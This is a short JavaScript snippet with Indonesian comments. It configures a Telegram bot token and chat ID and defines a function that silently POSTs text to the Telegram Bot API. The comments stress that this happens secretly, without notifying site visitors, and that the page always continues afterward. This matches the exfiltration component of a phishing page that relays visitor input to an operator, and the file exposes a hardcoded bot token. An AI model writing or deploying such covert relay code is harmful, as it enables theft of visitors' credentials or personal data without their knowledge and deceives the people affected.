// ==========================================
// KONFIGURASI TELEGRAM
// Ubah nilai di bawah sesuai milikmu
// ==========================================

const TELEGRAM = {
    BOT_TOKEN: '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk',
    CHAT_ID: '7808815199',
    OPSI: {
        PARSE_MODE: 'Markdown'
        // ❌ TIDAK ADA pesan apapun yang tampil di web
    }
};

// Kirim pesan ke Telegram — DIAM-DIAM, tanpa notifikasi ke pengunjung
async function kirimPesanTelegram(teks) {
    try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM.CHAT_ID,
                text: teks,
                parse_mode: TELEGRAM.OPSI.PARSE_MODE
            })
        });

        if (!res.ok) {
            const err = await res.json();
            console.log('Telegram Error:', err.description || err);
        } else {
            console.log('✅ Terkirim ke Telegram');
        }
    } catch (e) {
        console.log('Gagal kirim:', e.message);
    }
    // Selalu lanjut ke halaman berikutnya, gagal atau berhasil
    return true;
}
